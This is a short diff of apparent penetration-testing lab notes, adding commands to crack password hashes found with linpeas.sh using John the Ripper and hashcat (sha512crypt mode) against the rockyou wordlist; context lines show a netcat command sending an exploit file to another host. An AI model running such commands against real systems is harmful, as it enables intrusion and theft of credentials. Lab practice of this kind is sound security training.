@@ -623,6 +623,9 @@ drwxr-xr-x 98 root root 4.0K Oct 28  2022 ..
     //this box
     nc 192.168.45.214 9001 < exploit
 
+    //found some hashes with linpeas.sh
+    john challenge/2/192.168.X/245/hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+    hashcat -m 1800 -a 0 challenge/2/192.168.X/245/hashes.txt  /usr/share/wordlists/rockyou.txt
 
 ```
 # Exploit Steps
